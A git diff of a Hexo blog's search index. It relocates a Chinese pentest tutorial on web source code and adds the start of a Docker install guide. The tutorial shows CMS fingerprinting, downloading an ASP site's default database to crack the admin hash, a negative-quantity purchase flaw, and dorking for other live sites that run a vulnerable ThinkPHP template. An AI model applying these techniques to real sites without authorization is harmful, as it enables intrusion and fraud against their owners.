-<li><p>CMS识别技术获取CMS名称然后从网上下载</p>
-</li>
-<li><p>百度直接搜索：源码</p>
-</li>
-<li><p>咸鱼上会有卖</p>
-</li>
-<li><p>第三方源码站：比如菜鸟源码</p>
-</li>
-<li><p>各种行业对应</p>
-</li>
-</ul>
-<h1 id="八、总结"><a href="#八、总结" class="headerlink" title="八、总结"></a>八、总结</h1><p>&emsp;&emsp;关注应用分类及脚本类型估摸出可能存在的漏洞（其中框架类例外），在获取源码后可进行本地安全测试或代码审计，也可以分析其目录工作原理（数据库备份，bak 文件等），未获取到的源码采用各种方法想办法获取。</p>
-<h1 id="九、演示案例"><a href="#九、演示案例" class="headerlink" title="九、演示案例"></a>九、演示案例</h1><h2 id="1、ASP-PHP-等源码下安全测试"><a href="#1、ASP-PHP-等源码下安全测试" class="headerlink" title="1、ASP,PHP 等源码下安全测试"></a>1、ASP,PHP 等源码下安全测试</h2><p>&emsp;&emsp;平台识别-某 CMS 无漏洞-默认数据库 </p>
-<p>&emsp;&emsp;平台识别-某 CMS 有漏洞-漏洞利用  </p>
-<h3 id="（1）xycms搬家公司登入后台"><a href="#（1）xycms搬家公司登入后台" class="headerlink" title="（1）xycms搬家公司登入后台"></a>（1）xycms搬家公司登入后台</h3><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631318967273-2dc4af7d-3873-4042-b9a2-36b5d013ba75.png" alt="img"></p>
-<p>&emsp;&emsp;访问该网站，随便点点，观察URL可知，该网站应该是用asp语言做的</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631319101337-fbd0d592-a2a8-4ed2-899a-63b9e2e09b14.png" alt="img"></p>
-<p>&emsp;&emsp;同时可以看到该网站的CMS为xycms</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631319138909-9878e8f5-8f3a-456f-9bc3-f918c7a0a28d.png" alt="img"></p>
-<p>&emsp;&emsp;搜索XYCMS源码，下载<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626010251325-0a1c3d68-4ee9-4a02-ac2a-185f7c170855.png" alt="img"><br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626010251397-63f82ad0-d665-4b1c-9c5a-ac8cb3d5aa6f.png" alt="img"></p>
-<p>&emsp;&emsp;打开文件夹，寻找关键数据库路径文件xydata，找到文件xycms.mdb(asp特有文件)<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626010251489-84bd6b91-4334-4ff3-8450-dfd3bc6bd2f3.png" alt="img"><br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626010251565-12ea2248-7af3-4fd5-b032-75729ec3d675.png" alt="img"></p>
-<p>&emsp;&emsp;该文件存有管理员的账号密码<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626010251635-80713ae0-85bb-4ef1-b23a-8865a00cd5fc.png" alt="img"></p>
-<p>&emsp;&emsp;根据下载的源码路径，可以去尝试访问网站的目录： <a href="http://192.168.139.137:8003/xydata/xycms.mdb,">http://192.168.1.105:8003/xydata/xycms.mdb,</a>下载到文件<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626010251712-a9b04891-e869-41e7-90af-7036c4a05ac2.png" alt="img"></p>
-<p>&emsp;&emsp;尝试访问到后台<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626010251784-b3d8a32d-d9cc-4bec-b8ad-dfa220537c33.png" alt="img"></p>
-<p>&emsp;&emsp;数据库中admin数据 密码MD5解密<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631321110166-9fce48ff-8b26-4c45-91a1-8ee7c7219d1e.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631321136261-04fdccac-ae06-4424-9c5d-59debd5a8528.png" alt="img"></p>
-<p>&emsp;&emsp;使用用户密码即可登录<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631320610761-b9b2c3a5-461b-406d-8896-361d5b601caf.png" alt="img"></p>
-<h2 id="2、源码应用分类下的针对漏洞"><a href="#2、源码应用分类下的针对漏洞" class="headerlink" title="2、源码应用分类下的针对漏洞"></a>2、源码应用分类下的针对漏洞</h2><h3 id="（1）-niushop电商类关注漏洞点-业务逻辑"><a href="#（1）-niushop电商类关注漏洞点-业务逻辑" class="headerlink" title="（1） niushop电商类关注漏洞点-业务逻辑"></a>（1） niushop电商类关注漏洞点-业务逻辑</h3><p>&emsp;&emsp;买东西时，数量为一，提交的时候抓包，将数量改为-1，数量不可能为-1，因此白嫖</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631330648147-035b4214-db4d-464f-91ff-ca8d783b14e5.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631330675534-fd70a06f-630f-4c73-9561-0e43837b3313.png" alt="img"></p>
-<h2 id="3、简要目标从识别到源码获取"><a href="#3、简要目标从识别到源码获取" class="headerlink" title="3、简要目标从识别到源码获取"></a>3、简要目标从识别到源码获取</h2><h3 id="（1）本地演示个人博客-手工发现其-CMS-漏洞搜索或下载分析"><a href="#（1）本地演示个人博客-手工发现其-CMS-漏洞搜索或下载分析" class="headerlink" title="（1）本地演示个人博客-手工发现其 CMS-漏洞搜索或下载分析"></a>（1）本地演示个人博客-手工发现其 CMS-漏洞搜索或下载分析</h3><p>&emsp;&emsp;比如这个博客，复制到获取的某些文件的路径到搜索引擎中搜索，可以知道该网站的CMS为ZBlog</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631331534475-7924a9d1-3098-4b3c-b0d1-efe6c440b690.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631332135683-afa2fa70-fef1-4d60-99c8-f36546c4d387.png" alt="img"></p>
-<h3 id="（2）人工爆框架-搜索特定-url-获取其他相符站点-漏洞测试"><a href="#（2）人工爆框架-搜索特定-url-获取其他相符站点-漏洞测试" class="headerlink" title="（2）人工爆框架-搜索特定 url-获取其他相符站点-漏洞测试"></a>（2）人工爆框架-搜索特定 url-获取其他相符站点-漏洞测试</h3><p>&emsp;&emsp;<a href="http://weipan.1016sangshen.cn/">http://weipan.1016sangshen.cn/</a> 内部搭建的靶场</p>
-<p>&emsp;&emsp;这是最近一个非法网站币圈的网站，是真实的，这套源码都还有其他人在用</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631332275635-61d791a4-b1fc-42e7-9cf9-6118f9ab55a1.png" alt="img"></p>
-<p>&emsp;&emsp;可以看到为ThinkPhp</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631332332157-940dc439-61e2-4217-8307-bcc93a6dba79.png" alt="img"></p>
-<p>&emsp;&emsp;将URL放入工具中，存在漏洞，后续针对漏洞进行攻击即可</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631333207781-cec32b62-3834-442e-8977-4c8c10ad2bb3.png" alt="img"></p>
-<p>&emsp;&emsp;利用搜索引擎搜索该网站URL一栏上的：<code>index/login/login/token</code></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631332275635-61d791a4-b1fc-42e7-9cf9-6118f9ab55a1.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631333326437-92ae4783-6a8a-4ece-9d67-3b5e33703c36.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631333399106-017b0716-3304-4bf2-aa5d-543df4995d61.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631333414746-cb9977da-a138-43ea-bbd1-72814c952a9e.png" alt="img"></p>
-<p>&emsp;&emsp;这个就是跟之前的模板一模一样的，放入工具中，存在漏洞</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631333457287-38de9029-1f2a-498c-9cf8-17f7f47558db.png" alt="img"></p>
-<p>&emsp;&emsp;这个也是</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631333548325-8185638d-727d-4167-827a-583ee86c131b.png" alt="img"></p>
-<h3 id="（3）借助特定行业源码或咸鱼进行搜索获取-本地搭建-代码审计或其他"><a href="#（3）借助特定行业源码或咸鱼进行搜索获取-本地搭建-代码审计或其他" class="headerlink" title="（3）借助特定行业源码或咸鱼进行搜索获取-本地搭建-代码审计或其他"></a>（3）借助特定行业源码或咸鱼进行搜索获取-本地搭建-代码审计或其他</h3><p>&emsp;&emsp;菜鸟源码中，搜索微盘，就有好多这种模板的源码</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631333761353-6247f4ac-402a-44ab-84a0-ea78bbc597ed.png" alt="img"></p>
-<p>&emsp;&emsp;闲鱼</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631333921226-e728f653-4777-4a9d-8022-974c2a923a22.png" alt="img"></p>
-<h1 id="十、其他"><a href="#十、其他" class="headerlink" title="十、其他"></a>十、其他</h1><p>&emsp;&emsp;Github监控器：<a href="https://github.com/M4tir/Github-Monitor">https://github.com/M4tir/Github-Monitor</a></p>
-<p>&emsp;&emsp;大佬的博客：<a href="https://websec.readthedocs.io/zh/latest/language/index.html">https://websec.readthedocs.io/zh/latest/language/index.html</a></p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-      </categories>
-      <tags>
-        <tag>Web安全</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Windows入侵排查</title>
     <url>/post/fbbd4eb4.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><h2 id="1、什么是应急响应"><a href="#1、什么是应急响应" class="headerlink" title="1、什么是应急响应"></a>1、什么是应急响应</h2><p>“应急响应”对应的英文是“Incident Response”或“Emergency Response”等，通常是指一个组织为了应对各种意外事件的发生所做的准备以及在事件发生后所采取的措施。（百度）</p>
@@ -5437,6 +5324,119 @@
       </categories>
       <tags>
         <tag>应急响应</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Web源码拓展</title>
+    <url>/post/de8a59bf.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>&emsp;&emsp;WEB 源码在安全测试中是非常重要的信息来源，可以用来代码审计漏洞也可以用来做信息突破口，其中 WEB 源码有很多技术需要简明分析。 比如：获取某 ASP 源码后可以采用默认数据库下载为突破，获取某其他脚本源码漏洞可以进行代码审计挖掘或分析其业务逻辑等，总之源码的获取将为后期的安全测试提供了更多的思路。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009190194-959ddb49-0e3e-4e9c-824e-8356fe945d9c.png" alt="img"></p>
+<h1 id="二、关于Web源码目录结构"><a href="#二、关于Web源码目录结构" class="headerlink" title="二、关于Web源码目录结构"></a>二、关于Web源码目录结构</h1><p>&emsp;&emsp;数据库配置文件，后台目录，模板目录，数据库目录等</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">index.php 根据文件后缀判定</span><br><span class="line">admin 网站后台路径</span><br><span class="line">data 数据相关目录</span><br><span class="line">install 安装目录</span><br><span class="line">member 会员目录</span><br><span class="line">template 模板目录(和网站相关的整体架构)</span><br><span class="line">data =&gt; confing.php 数据库配置文件，网站和数据库的通讯信息，连接账号密码，可以去连接对方数据库，从数据库去得到这个网站的源码里面涉及到的管理员的账号密码。</span><br></pre></td></tr></table></figure>
+
+<h1 id="三、关于Web源码脚本类型"><a href="#三、关于Web源码脚本类型" class="headerlink" title="三、关于Web源码脚本类型"></a>三、关于Web源码脚本类型</h1><p>&emsp;&emsp;ASP，PHP，ASPX，JSP，JAVAWEB等脚本类型源码安全问题</p>
+<h1 id="四、关于Web源码应用分类"><a href="#四、关于Web源码应用分类" class="headerlink" title="四、关于Web源码应用分类"></a>四、关于Web源码应用分类</h1><p>&emsp;&emsp;社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞</p>
+<p>&emsp;&emsp;开源，未开源问题， 框架非框架问题，关于CMS识别问题及后续等</p>
+<p>&emsp;&emsp;拿到对方的源码或者判断这个网站的应用类型之后应该侧重在哪些漏洞上做文章</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">门户网站------------------------综合类漏洞</span><br><span class="line">电商------------------------------业务逻辑漏洞</span><br><span class="line">论坛------------------------------XSS漏洞</span><br><span class="line">博客------------------------------漏洞较少</span><br><span class="line">第三方---------------------------根据功能决定</span><br></pre></td></tr></table></figure>
+
+<h1 id="五、关于Web源码其他说明"><a href="#五、关于Web源码其他说明" class="headerlink" title="五、关于Web源码其他说明"></a>五、关于Web源码其他说明</h1><h2 id="1、框架与非框架"><a href="#1、框架与非框架" class="headerlink" title="1、框架与非框架"></a>1、框架与非框架</h2><p>&emsp;&emsp;如果对方网站采用的是框架开发的话那么你面对的就是寻找框架的漏洞，如果是非框架的话寻找的漏洞针对的是代码写出来的漏洞（代码审计）</p>
+<p>&emsp;&emsp;比如：thinkPHP漏洞</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631293351122-9dbf0276-75c9-45eb-a615-80b48801c33c.png" alt="img"></p>
+<h2 id="2、CMS识别"><a href="#2、CMS识别" class="headerlink" title="2、CMS识别"></a>2、CMS识别</h2><h3 id="（1）CMS的概念"><a href="#（1）CMS的概念" class="headerlink" title="（1）CMS的概念"></a>（1）CMS的概念</h3><p>&emsp;&emsp;CMS是Content Management System的缩写，意为”内容管理系统”。 内容管理系统是企业信息化建设和电子政务的新宠，也是一个相对较新的市场。 内容管理系统组成要素</p>
+<ul>
+<li><p>文档模板</p>
+</li>
+<li><p>脚本语言或标记语言</p>
+</li>
+<li><p>与数据库集成</p>
+</li>
+</ul>
+<h3 id="（2）CMS识别方法"><a href="#（2）CMS识别方法" class="headerlink" title="（2）CMS识别方法"></a>（2）CMS识别方法</h3><h4 id="①-人工识别"><a href="#①-人工识别" class="headerlink" title="① 人工识别"></a>① 人工识别</h4><p>&emsp;&emsp;直接看出来</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631293980513-4a2c0f3b-aae7-4b9f-bdde-fc37fa630102.png" alt="img"></p>
+<h4 id="②-CMS识别在线工具"><a href="#②-CMS识别在线工具" class="headerlink" title="② CMS识别在线工具"></a>② CMS识别在线工具</h4><p>&emsp;&emsp;在线cms指纹识别：<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631293657770-654bae62-7305-4d56-9102-c9dab166728c.png" alt="img"></p>
+<p>&emsp;&emsp;云悉：<a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631293692731-0fe7d591-52b7-4566-a8aa-a1d96fb61214.png" alt="img"></p>
+<h4 id="③-工具"><a href="#③-工具" class="headerlink" title="③ 工具"></a>③ 工具</h4><p><strong>使用字典</strong></p>
+<p>&emsp;&emsp;因为每个文件都有个特定的md5值，我们可以通过访问一个网站的文件，保存到本地后，查看该文件的md5值，和字典中的md5值进行比较，如果相同，说明该网站的cms对应字典上该条记录的cms</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631322562277-e6883691-ab81-4f74-a27e-6b6a7bedb2a9.png" alt="img"></p>
+<p>&emsp;&emsp;查看文件MD5等值的命令</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">certutil <span class="literal">-hashfile</span> D:\file.txt MD5</span><br><span class="line"></span><br><span class="line">certutil <span class="literal">-hashfile</span> D:\file.txt SHA1</span><br><span class="line"></span><br><span class="line">certutil <span class="literal">-hashfile</span> D:\file.txt SHA256</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;假设访问这个网站：<a href="http://192.168.1.105:8032/%EF%BC%8C%E5%B0%9D%E8%AF%95%E8%AE%BF%E9%97%AEhttp://192.168.1.105:8032/favicon.ico">http://192.168.1.105:8032/，尝试访问http://192.168.1.105:8032/favicon.ico</a> ，的确存在该图标，将该图标文件保存到本地</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631323530035-7fff5410-b4cd-47fa-80de-c5c505c3d6d3.png" alt="img"></p>
+<p>&emsp;&emsp;生成该文件的md5值：<code>certutil -hashfile favico.ico md5</code></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631323446326-e24e27f0-280f-4a59-934e-554ef9db4815.png" alt="img"></p>
+<p>&emsp;&emsp;在字典中查询md5值，发现有记录，该CMS对应的是metinfo，正确</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631323410923-9af97530-9da8-47b4-b11b-101660153a48.png" alt="img"></p>
+<p>&emsp;&emsp;字典链接：<a href="https://github.com/Lucifer1993/cmsprint">https://github.com/Lucifer1993/cmsprint</a></p>
+<h1 id="六、开源或内部"><a href="#六、开源或内部" class="headerlink" title="六、开源或内部"></a>六、开源或内部</h1><p>&emsp;&emsp;开源：去网上找寻漏洞文章。直接找漏洞或审计（可以通过CMS识别出来的）</p>
+<p>&emsp;&emsp;内部：常规的渗透测试，用扫描工具去判断。（找不到源码或者不知道对方的CMS名称）</p>
+<h1 id="七、源码获取"><a href="#七、源码获取" class="headerlink" title="七、源码获取"></a>七、源码获取</h1><ul>
+<li><p>扫描工具探测备份文件</p>
+</li>
+<li><p>CMS识别技术获取CMS名称然后从网上下载</p>
+</li>
+<li><p>百度直接搜索：源码</p>
+</li>
+<li><p>咸鱼上会有卖</p>
+</li>
+<li><p>第三方源码站：比如菜鸟源码</p>
+</li>
+<li><p>各种行业对应</p>
+</li>
+</ul>
+<h1 id="八、总结"><a href="#八、总结" class="headerlink" title="八、总结"></a>八、总结</h1><p>&emsp;&emsp;关注应用分类及脚本类型估摸出可能存在的漏洞（其中框架类例外），在获取源码后可进行本地安全测试或代码审计，也可以分析其目录工作原理（数据库备份，bak 文件等），未获取到的源码采用各种方法想办法获取。</p>
+<h1 id="九、演示案例"><a href="#九、演示案例" class="headerlink" title="九、演示案例"></a>九、演示案例</h1><h2 id="1、ASP-PHP-等源码下安全测试"><a href="#1、ASP-PHP-等源码下安全测试" class="headerlink" title="1、ASP,PHP 等源码下安全测试"></a>1、ASP,PHP 等源码下安全测试</h2><p>&emsp;&emsp;平台识别-某 CMS 无漏洞-默认数据库 </p>
+<p>&emsp;&emsp;平台识别-某 CMS 有漏洞-漏洞利用  </p>
+<h3 id="（1）xycms搬家公司登入后台"><a href="#（1）xycms搬家公司登入后台" class="headerlink" title="（1）xycms搬家公司登入后台"></a>（1）xycms搬家公司登入后台</h3><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631318967273-2dc4af7d-3873-4042-b9a2-36b5d013ba75.png" alt="img"></p>
+<p>&emsp;&emsp;访问该网站，随便点点，观察URL可知，该网站应该是用asp语言做的</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631319101337-fbd0d592-a2a8-4ed2-899a-63b9e2e09b14.png" alt="img"></p>
+<p>&emsp;&emsp;同时可以看到该网站的CMS为xycms</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631319138909-9878e8f5-8f3a-456f-9bc3-f918c7a0a28d.png" alt="img"></p>
+<p>&emsp;&emsp;搜索XYCMS源码，下载<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626010251325-0a1c3d68-4ee9-4a02-ac2a-185f7c170855.png" alt="img"><br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626010251397-63f82ad0-d665-4b1c-9c5a-ac8cb3d5aa6f.png" alt="img"></p>
+<p>&emsp;&emsp;打开文件夹，寻找关键数据库路径文件xydata，找到文件xycms.mdb(asp特有文件)<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626010251489-84bd6b91-4334-4ff3-8450-dfd3bc6bd2f3.png" alt="img"><br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626010251565-12ea2248-7af3-4fd5-b032-75729ec3d675.png" alt="img"></p>
+<p>&emsp;&emsp;该文件存有管理员的账号密码<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626010251635-80713ae0-85bb-4ef1-b23a-8865a00cd5fc.png" alt="img"></p>
+<p>&emsp;&emsp;根据下载的源码路径，可以去尝试访问网站的目录： <a href="http://192.168.139.137:8003/xydata/xycms.mdb,">http://192.168.1.105:8003/xydata/xycms.mdb,</a>下载到文件<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626010251712-a9b04891-e869-41e7-90af-7036c4a05ac2.png" alt="img"></p>
+<p>&emsp;&emsp;尝试访问到后台<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626010251784-b3d8a32d-d9cc-4bec-b8ad-dfa220537c33.png" alt="img"></p>
+<p>&emsp;&emsp;数据库中admin数据 密码MD5解密<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631321110166-9fce48ff-8b26-4c45-91a1-8ee7c7219d1e.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631321136261-04fdccac-ae06-4424-9c5d-59debd5a8528.png" alt="img"></p>
+<p>&emsp;&emsp;使用用户密码即可登录<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631320610761-b9b2c3a5-461b-406d-8896-361d5b601caf.png" alt="img"></p>
+<h2 id="2、源码应用分类下的针对漏洞"><a href="#2、源码应用分类下的针对漏洞" class="headerlink" title="2、源码应用分类下的针对漏洞"></a>2、源码应用分类下的针对漏洞</h2><h3 id="（1）-niushop电商类关注漏洞点-业务逻辑"><a href="#（1）-niushop电商类关注漏洞点-业务逻辑" class="headerlink" title="（1） niushop电商类关注漏洞点-业务逻辑"></a>（1） niushop电商类关注漏洞点-业务逻辑</h3><p>&emsp;&emsp;买东西时，数量为一，提交的时候抓包，将数量改为-1，数量不可能为-1，因此白嫖</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631330648147-035b4214-db4d-464f-91ff-ca8d783b14e5.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631330675534-fd70a06f-630f-4c73-9561-0e43837b3313.png" alt="img"></p>
+<h2 id="3、简要目标从识别到源码获取"><a href="#3、简要目标从识别到源码获取" class="headerlink" title="3、简要目标从识别到源码获取"></a>3、简要目标从识别到源码获取</h2><h3 id="（1）本地演示个人博客-手工发现其-CMS-漏洞搜索或下载分析"><a href="#（1）本地演示个人博客-手工发现其-CMS-漏洞搜索或下载分析" class="headerlink" title="（1）本地演示个人博客-手工发现其 CMS-漏洞搜索或下载分析"></a>（1）本地演示个人博客-手工发现其 CMS-漏洞搜索或下载分析</h3><p>&emsp;&emsp;比如这个博客，复制到获取的某些文件的路径到搜索引擎中搜索，可以知道该网站的CMS为ZBlog</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631331534475-7924a9d1-3098-4b3c-b0d1-efe6c440b690.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631332135683-afa2fa70-fef1-4d60-99c8-f36546c4d387.png" alt="img"></p>
+<h3 id="（2）人工爆框架-搜索特定-url-获取其他相符站点-漏洞测试"><a href="#（2）人工爆框架-搜索特定-url-获取其他相符站点-漏洞测试" class="headerlink" title="（2）人工爆框架-搜索特定 url-获取其他相符站点-漏洞测试"></a>（2）人工爆框架-搜索特定 url-获取其他相符站点-漏洞测试</h3><p>&emsp;&emsp;<a href="http://weipan.1016sangshen.cn/">http://weipan.1016sangshen.cn/</a> 内部搭建的靶场</p>
+<p>&emsp;&emsp;这是最近一个非法网站币圈的网站，是真实的，这套源码都还有其他人在用</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631332275635-61d791a4-b1fc-42e7-9cf9-6118f9ab55a1.png" alt="img"></p>
+<p>&emsp;&emsp;可以看到为ThinkPhp</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631332332157-940dc439-61e2-4217-8307-bcc93a6dba79.png" alt="img"></p>
+<p>&emsp;&emsp;将URL放入工具中，存在漏洞，后续针对漏洞进行攻击即可</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631333207781-cec32b62-3834-442e-8977-4c8c10ad2bb3.png" alt="img"></p>
+<p>&emsp;&emsp;利用搜索引擎搜索该网站URL一栏上的：<code>index/login/login/token</code></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631332275635-61d791a4-b1fc-42e7-9cf9-6118f9ab55a1.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631333326437-92ae4783-6a8a-4ece-9d67-3b5e33703c36.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631333399106-017b0716-3304-4bf2-aa5d-543df4995d61.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631333414746-cb9977da-a138-43ea-bbd1-72814c952a9e.png" alt="img"></p>
+<p>&emsp;&emsp;这个就是跟之前的模板一模一样的，放入工具中，存在漏洞</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631333457287-38de9029-1f2a-498c-9cf8-17f7f47558db.png" alt="img"></p>
+<p>&emsp;&emsp;这个也是</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631333548325-8185638d-727d-4167-827a-583ee86c131b.png" alt="img"></p>
+<h3 id="（3）借助特定行业源码或咸鱼进行搜索获取-本地搭建-代码审计或其他"><a href="#（3）借助特定行业源码或咸鱼进行搜索获取-本地搭建-代码审计或其他" class="headerlink" title="（3）借助特定行业源码或咸鱼进行搜索获取-本地搭建-代码审计或其他"></a>（3）借助特定行业源码或咸鱼进行搜索获取-本地搭建-代码审计或其他</h3><p>&emsp;&emsp;菜鸟源码中，搜索微盘，就有好多这种模板的源码</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631333761353-6247f4ac-402a-44ab-84a0-ea78bbc597ed.png" alt="img"></p>
+<p>&emsp;&emsp;闲鱼</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631333921226-e728f653-4777-4a9d-8022-974c2a923a22.png" alt="img"></p>
+<h1 id="十、其他"><a href="#十、其他" class="headerlink" title="十、其他"></a>十、其他</h1><p>&emsp;&emsp;Github监控器：<a href="https://github.com/M4tir/Github-Monitor">https://github.com/M4tir/Github-Monitor</a></p>
+<p>&emsp;&emsp;大佬的博客：<a href="https://websec.readthedocs.io/zh/latest/language/index.html">https://websec.readthedocs.io/zh/latest/language/index.html</a></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
       </tags>
   </entry>
   <entry>
@@ -6090,6 +6090,74 @@
       </tags>
   </entry>
   <entry>
+    <title>docker安装</title>
+    <url>/post/327177db.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、Docker的基本组成"><a href="#一、Docker的基本组成" class="headerlink" title="一、Docker的基本组成"></a>一、Docker的基本组成</h1><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630189658121-fda48094-6318-4c60-b251-4e740542c1fc.png" alt="img"></p>
+<p><strong>1、镜像（image）：</strong></p>
+<p>&emsp;&emsp;Docker镜像就好比是一个模板，可以通过这个模板来创建容器服务，Tomcat镜像==&gt;run==&gt;Tomecat01容器（提供服务），通过这个镜像可以创建多个容器（最终服务或者项目运行就是在容器中的</p>
+<p><strong>2、容器（container）：</strong></p>
+<p>&emsp;&emsp;通过镜像来创建的</p>
+<p>&emsp;&emsp;Docker利用容器技术，独立运行一个或者一组应用</p>
+<p>&emsp;&emsp;目前就可以把这个容器理解为就是一个简易的Linux系统</p>
+<p><strong>3、仓库（repository）：</strong></p>
+<p>&emsp;&emsp;仓库就是存放镜像的地方</p>
+<p>&emsp;&emsp;仓库分为公有仓库和私有仓库</p>
+<h1 id="二、安装Docker"><a href="#二、安装Docker" class="headerlink" title="二、安装Docker"></a>二、安装Docker</h1><h2 id="1、环境准备"><a href="#1、环境准备" class="headerlink" title="1、环境准备"></a>1、环境准备</h2><ul>
+<li><p>需要Linux基础</p>
+</li>
+<li><p>CentOS7</p>
+</li>
+<li><p>使用XShell等连接远程服务器进行操作</p>
